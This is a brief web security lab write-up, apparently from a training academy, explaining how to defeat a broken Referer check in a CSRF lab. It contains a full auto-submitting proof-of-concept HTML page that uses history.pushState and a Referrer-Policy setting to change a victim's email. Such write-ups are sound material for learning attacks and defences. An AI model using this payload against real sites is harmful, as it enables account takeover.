# Lab: CSRF with broken Referer validation

Intercept an email change request and send it to the repeater. Modify the referer and notice that as long as the website domain is part of the string, even though the full domain string is actually different.

Use the following exploit to trigger the vulnerability:
```<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?acb61fad1ec8adb5c09908e900440055.web-security-academy.net')</script>
    <form action="https://acb61fad1ec8adb5c09908e900440055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>```

This uses the `history.pushState()` function to include the target site domain as a query string, satisfying the referer checks.

The exploit also needs the following set in the "Head" section in order for the browser to include the query string: `Referrer-Policy: unsafe-url`